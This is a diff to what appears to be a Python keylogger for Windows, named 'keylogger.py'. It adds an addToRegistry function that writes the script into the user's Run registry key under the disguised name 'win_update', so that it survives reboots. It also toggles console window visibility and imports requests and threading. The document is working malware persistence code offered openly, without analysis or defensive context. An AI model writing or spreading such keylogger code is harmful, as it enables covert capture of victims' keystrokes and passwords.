@@ -7,11 +7,24 @@ import requests
 import datetime
 import threading
 import winreg as reg  
-import os  
+import os 
+from tkintertable import App 
 
 win = win32console.GetConsoleWindow() 
-win32gui.ShowWindow(win, 0) 
+win32gui.ShowWindow(win, 1) 
+App.main() #debug the windows startup
 
+
+def addToRegistry(): #add to windows startup
+	pth = os.path.dirname(os.path.realpath(__file__)) 
+	script="keylogger.py"
+	address=os.path.join(pth,script)
+	print(address)
+	key = reg.HKEY_CURRENT_USER 
+	key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+	open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
+	reg.SetValueEx(open,"win_update",0,reg.REG_SZ,address)
+	reg.CloseKey(open) 
 
 virtual_keyboard={
 	"96": "0",
